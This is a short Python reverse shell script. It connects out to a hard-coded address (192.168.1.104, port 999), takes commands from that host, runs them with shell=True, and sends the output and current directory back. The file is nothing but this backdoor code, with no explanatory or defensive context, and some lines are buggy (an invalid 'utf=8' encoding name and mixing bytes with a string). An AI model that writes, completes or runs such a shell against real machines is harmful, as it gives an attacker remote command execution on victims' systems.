import os
import socket
import subprocess

s = socket.socket()
host = "192.168.1.104"
port = 999
s.connect((host, port))

while(1):
    data = s.recv(1024)
    if data[:2].decode("utf=8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell = "True", stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        outputBytes = cmd.stdout.read() + cmd.stderr.read()
        outputStr = str(outputBytes, "utf-8")
        s.send(str.encode(outputBytes + str(os.getcwd()) + "> "))
        print(outputStr)

s.close()